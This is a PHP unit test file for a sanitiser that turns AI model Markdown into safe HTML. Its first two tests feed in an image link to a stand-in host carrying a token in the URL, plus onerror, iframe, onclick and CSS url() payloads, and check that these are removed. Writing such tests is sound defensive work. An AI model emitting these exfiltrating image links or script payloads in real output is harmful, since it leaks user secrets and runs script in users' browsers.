<?php

namespace Tests\Unit\Support;

use App\Support\SafeAssistantMarkdown;
use Tests\TestCase;

class SafeAssistantMarkdownTest extends TestCase
{
    public function test_it_removes_markdown_images_without_breaking_links(): void
    {
        $html = app(SafeAssistantMarkdown::class)->toHtml(
            'Lihat ![secret](https://evil.test/leak.png?data=token) dan [tautan](https://example.com). Teks ñ é tetap utuh.'
        );

        $this->assertStringContainsString('Lihat', $html);
        $this->assertStringContainsString('Teks ñ é tetap utuh.', $html);
        $this->assertStringContainsString('<a href="https://example.com">tautan</a>', $html);
        $this->assertStringNotContainsString('<img', $html);
        $this->assertStringNotContainsString('https://evil.test', $html);
    }

    public function test_it_removes_resource_loading_html_left_after_markdown_rendering(): void
    {
        $html = app(SafeAssistantMarkdown::class)->toHtml(implode('', [
            '<img src="https://evil.test/a.png" onerror="alert(1)">',
            '<iframe src="https://evil.test/embed"></iframe>',
            '<p onclick="alert(1)" style="background:url(https://evil.test/b.png)">Aman</p>',
        ]));

        $this->assertStringContainsString('Aman', $html);
        $this->assertStringNotContainsString('<img', $html);
        $this->assertStringNotContainsString('<iframe', $html);
        $this->assertStringNotContainsString('onclick', $html);
        $this->assertStringNotContainsString('style=', $html);
        $this->assertStringNotContainsString('https://evil.test', $html);
    }

    public function test_it_wraps_code_blocks_with_copy_controls_and_tables_with_overflow_wrapper(): void
    {
        $html = app(SafeAssistantMarkdown::class)->toHtml(implode("\n", [
            '```php',
            'echo "hello";',
            '```',
            '',
            '| Kolom | Nilai |',
            '| --- | --- |',
            '| A | 1 |',
        ]));

        $this->assertStringContainsString('data-ista-code-block', $html);
        $this->assertStringContainsString('data-ista-copy-code', $html);
        $this->assertStringContainsString('class="language-php"', $html);
        $this->assertStringContainsString('ista-table-wrap overflow-x-auto', $html);
        $this->assertStringContainsString('echo "hello";', $html);

        // A table must be wrapped exactly once (no nested identical wrappers).
        $this->assertSame(1, substr_count($html, 'ista-table-wrap'));
    }
}
